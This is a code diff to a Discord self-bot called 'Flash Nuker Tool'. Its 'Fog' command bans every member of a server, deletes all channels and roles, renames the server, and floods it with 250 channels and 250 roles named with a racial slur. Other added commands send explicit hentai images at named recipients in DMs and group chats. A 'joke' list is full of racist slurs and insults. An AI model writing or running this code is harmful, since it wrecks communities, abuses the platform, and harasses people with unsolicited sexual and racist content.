@@ -41,16 +41,14 @@ def startprint():
         antiafk = 'Disabled'
 
      print(f'''{Fore.RESET}
-                     {Fore.YELLOW}  ▄████  ▄▄▄       ███▄    █   ▄████   ██████ ▄▄▄█████▓ █    ██  ██░ ██  ██░ ██ 
-                     {Fore.YELLOW} ██▒ ▀█▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▒██    ▒ ▓  ██▒ ▓▒ ██  ▓██▒▓██░ ██▒▓██░ ██▒
-                     {Fore.YELLOW}▒██░▄▄▄░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   ▒ ▓██░ ▒░▓██  ▒██░▒██▀▀██░▒██▀▀██░
-                     {Fore.YELLOW}░▓█  ██▓░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓  ▒   ██▒░ ▓██▓ ░ ▓▓█  ░██░░▓█ ░██ ░▓█ ░██ 
-                     {Fore.YELLOW}░▒▓███▀▒ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒▒██████▒▒  ▒██▒ ░ ▒▒█████▓ ░▓█▒░██▓░▓█▒░██▓
-                     {Fore.YELLOW} ░▒   ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░▒▓▒ ▒ ▒  ▒ ░░▒░▒ ▒ ░░▒░▒
-                     {Fore.YELLOW}  ░   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░    ░    ░░▒░ ░ ░  ▒ ░▒░ ░ ▒ ░▒░ ░
-                     {Fore.YELLOW}░ ░   ░   ░   ▒      ░   ░ ░ ░ ░   ░ ░  ░  ░    ░       ░░░ ░ ░  ░  ░░ ░ ░  ░░ ░
-                     {Fore.YELLOW}      ░       ░  ░         ░       ░       ░              ░      ░  ░  ░ ░  ░  ░
-                                                                                
+                     {Fore.RED} oooooooooooo ooooo              .o.        .oooooo..o ooooo   ooooo
+                     {Fore.RED}`888'     `8 `888'             .888.      d8P'    `Y8 `888'   `888'
+                     {Fore.RED} 888          888             .8"888.     Y88bo.       888     888 
+                     {Fore.RED} 888oooo8     888            .8' `888.     `"Y8888o.   888ooooo888 
+                     {Fore.RED} 888    "     888           .88ooo8888.        `"Y88b  888     888 
+                     {Fore.RED} 888          888       o  .8'     `888.  oo     .d8P  888     888 
+                     {Fore.RED}o888o        o888ooooood8 o88o     o8888o 8""88888P'  o888o   o888o
+                    
                                     
                         {Fore.RED}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
                         {Fore.RED}ID ==> {Fore.WHITE}{Ioxide.user.id}
@@ -172,6 +170,259 @@ async def on_connect():
 
     startprint()
     ctypes.windll.kernel32.SetConsoleTitleW(f'[ Flash Nuker Tool v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')
+
+@Ioxide.command()
+async def help(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_SPEED FORCE_",color= discord.Color(0x000000))
+    em.add_field(name="_*Banning*_",value="Zoom",inline=False)
+    em.add_field(name="_*Kicking*_",value="Savitar",inline=False)
+    em.add_field(name="_*AntiAfk*_",value="Reverse Flash",inline=False)
+    em.add_field(name="_*Wizzing*_",value="Trajectory",inline=False)
+    em.add_field(name="_*Trolling*_",value="Impulse",inline=False)
+    em.add_field(name="_*NSFW*_",value="Kid Flash",inline=False)
+    em.set_image(url="https://media3.giphy.com/media/11yjQeATzTIQcRqkT8/giphy.gif?cid=790b76118cc5395898082e76801c9257c217c0e4fdc0445c&rid=giphy.gif&ct=g")
+    em.set_footer(text="My goals are beyond your understanding")
+    await ctx.send(embed=em)
+@Ioxide.command()
+async def fuck(ctx, recipients):
+    await ctx.message.delete() 
+    if isinstance(ctx.message.channel, discord.GroupChannel): # makes it work in gcs (finally got it i was so retarded LOL)
+        r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+
+    elif isinstance(ctx.message.channel, discord.DMChannel): # makes it work in dms
+            r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
+            res = r.json()
+            em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
+            em.set_image(url=res['url'])
+    await ctx.send(embed=em) 
+@Ioxide.command()
+async def anal(ctx, recipients):
+    await ctx.message.delete() 
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/anal")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/anal")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**anal**_ ', color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em) 
+@Ioxide.command()
+async def afk(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_AFK Help_",color= discord.Color(0x000000))
+    em.add_field(name="_*AfkCheck*_",value="Starts an afk check",inline=False)
+    em.set_image(url="https://static.comicvine.com/uploads/original/11133/111330189/6981553-th.gif")
+    em.set_footer(text="dont fold lmfao")
+    await ctx.send(embed=em)
+@Ioxide.command(aliases=['sayajoke','jokepack'])
+async def joke(ctx):
+    ## idfk how to do tables for the jokes or this would be cleaner
+    jokes = ["Nigga you overdosed from adrenaline rushes nigga fuck is you sayin","Aye nigga the first time you rode a skateboard you started twisting yo spine back and forth thinking you was accelerating nigga you dumb as shit","That wasn't funny nigga that's why yo long lost pet jaguar was found in west virginia eating rat soup in a pawn shop nigga you ugly as shit","That's why all yo subscribers unsubbed from yo youtube channel the first time you did a face-cam because you was ugly as shit","you smell like shit boy you shower with orange juice smelly ass nigga","you have sex with indian cockaroaches goofy ass nigga","your tities built like doritos nasty ass nigga Mmmm doritos nacho titty ass nigga","When you sneeze you got no recoil boy you be sendin yo spit everywhere"]
+    await ctx.message.delete()
+    randomJoke = random.choice(jokes)
+    msg = randomJoke
+    await ctx.send(msg)
+   
+@Ioxide.command()
+async def wizzing(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_*Wizzing Help*_",color= discord.Color(0x000000))
+    em.add_field(name="_*Destroy*_",value="Fucks a servers channels and roles",inline=False)
+    em.set_image(url="https://pa1.narvii.com/7021/e49f24272192348a72b91e758223b2a05486aeber1-540-304_hq.gif")
+    em.set_footer(text="Dont let this happen to u lol")
+    await ctx.send(embed=em)
+@Ioxide.command()
+async def check(ctx):
+    await ctx.message.delete()
+    await ctx.send('afk check')
+    time.sleep(0.4)
+    await ctx.send('10')
+    time.sleep(0.4)
+    await ctx.send('9')
+    time.sleep(0.4)
+    await ctx.send('8')
+    time.sleep(0.4)
+    await ctx.send('7')
+    time.sleep(0.4)
+    await ctx.send('6')
+    time.sleep(0.4)
+    await ctx.send('5')
+    time.sleep(0.4)
+    await ctx.send('4')
+    time.sleep(0.4)
+    await ctx.send('3')
+    time.sleep(0.4)
+    await ctx.send('2')
+    time.sleep(0.4)
+    await ctx.send('1')
+    time.sleep(0.4)
+    await ctx.send('0')
+       
+@Ioxide.command()
+async def blood(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_GET YOUR LIFE BACK IN BLOOD_",color= discord.Color(0x000000))
+    em.set_image(url="https://media1.tenor.com/images/e51a753d53c7068add1e99a6ef92031c/tenor.gif?itemid=6184096")
+    await ctx.send(embed=em)
     
-    if __name__ == '__main__':
-        Init()
+@Ioxide.command()
+async def smoke(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_WHO I SMOKE???_",color= discord.Color(0x000000))
+    em.add_field(name="_*My Sons*_",value="Flex, Zeus Account, Shirus, Skeezer, Kami",inline=False)
+    await ctx.send(embed=em)
+    
+    
+@Ioxide.command()
+async def maker(ctx):
+    await ctx.message.delete()
+    em = discord.Embed(title="_GodSpeed_",color= discord.Color(0x000000))
+    em.add_field(name="_**Flash Owns You**_",value="ScreamW",inline=False)
+    em.set_image(url="https://78.media.tumblr.com/91b0bb5140c2641996febba9e9a32033/tumblr_p5k3vxUFrz1uwyauro1_r1_540.gif")
+    em.set_footer(text="Made By The Speedsters")
+    await ctx.send(embed=em)
+@Ioxide.command()
+async def cum(ctx, recipients):
+    await ctx.message.delete() 
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/cum")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/cum")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em) 
+
+@Ioxide.command()
+async def head(ctx, recipients):
+    await ctx.message.delete()
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/blowjob")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/blowjob")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em)
+
+@Ioxide.command()
+async def spank(ctx, recipients):
+    await ctx.message.delete()
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/spank")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/spank")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em)
+
+@Ioxide.command()
+async def boobs(ctx, recipients):
+    await ctx.message.delete()
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/boobs")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/boobs")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em)
+
+@Ioxide.command()
+async def pussy(ctx, recipients):
+    await ctx.message.delete()
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/pussy")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/pussy")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em)
+
+@Ioxide.command()
+async def kiss(ctx, recipients):
+    await ctx.message.delete() 
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        r = requests.get("https://nekos.life/api/v2/img/kiss")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        r = requests.get("https://nekos.life/api/v2/img/kiss")
+        res = r.json()
+        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
+        em.set_image(url=res['url'])
+    await ctx.send(embed=em) 
+@Ioxide.command()
+async def hammer(ctx, recipients):
+    await ctx.message.delete() 
+    if isinstance(ctx.message.channel, discord.GroupChannel):
+        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**a death punch**_', color= discord.Color(0x000000))
+        em.set_image(url="https://78.media.tumblr.com/37dadedf277dd7c06d802130225cf5fb/tumblr_inline_o3346rGusF1r8a94o_500.gif")
+
+    elif isinstance(ctx.message.channel, discord.DMChannel):
+        em = discord.Embed(description=Ioxide.user.name+' _**punched**_ '+recipients+' _**lights out**_ ', color= discord.Color(0x000000))
+        em.set_image(url="https://78.media.tumblr.com/37dadedf277dd7c06d802130225cf5fb/tumblr_inline_o3346rGusF1r8a94o_500.gif")
+    await ctx.send(embed=em) 
+@Ioxide.command(aliases=['serverdestroy','ruinserver','doafredo'])
+async def Fog(ctx):
+    await ctx.message.delete()
+    for user in list(ctx.guild.members):
+        try:
+            await user.ban()
+        except:
+            pass
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete()
+        except:
+            pass
+    for role in list(ctx.guild.roles):
+        try:
+            await role.delete()
+        except:
+            pass
+    try:
+        await ctx.guild.edit(
+            name="Flash Trapped You",
+            description="We are your gods",
+            reason="LOL",
+            icon="none",
+            banner=None
+        )
+    except:
+        pass
+    for _i in range(250):
+        await ctx.guild.create_text_channel(name="Husk W Nigga")
+    for _i in range(250):
+        await ctx.guild.create_role(name="MistW", color=())
+
+if __name__ == '__main__':
+    Init()
